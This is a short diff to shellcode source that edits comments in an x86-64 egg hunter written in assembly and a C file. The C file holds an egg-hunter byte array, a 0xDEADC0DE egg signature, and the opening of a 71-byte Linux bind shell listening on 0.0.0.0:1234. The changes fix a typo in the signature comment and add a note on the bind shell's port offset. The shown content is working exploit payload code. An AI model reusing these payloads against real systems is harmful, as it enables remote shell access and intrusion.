@@ -48,7 +48,7 @@ nxt_addr:
     cmp     al, 0xF2  ; -EFAULT means bad address
     je      nxt_page  ; keep going until good read
     
-    ; put your own egg signature here
+    ; put your own signature here
     mov     eax, 0xDEADC0DE
     scasd
     jne     nxt_addr
@@ -95,11 +95,14 @@ char EGG64[] = {
   /* 0024 */ "\xff\xe7"             /* jmp rdi             */
 };
 
-// sig is 0xDEADCODE
+// sig is 0xDEADC0DE
 #define EGG_SIG "\xDE\xC0\xAD\xDE"
 
 // 71 byte bind shell for x86-64 Linux.  
 // listens on 0.0.0.0:1234
+//
+// port offset is 0x010
+//
 char BS[] = {
   EGG_SIG
   EGG_SIG
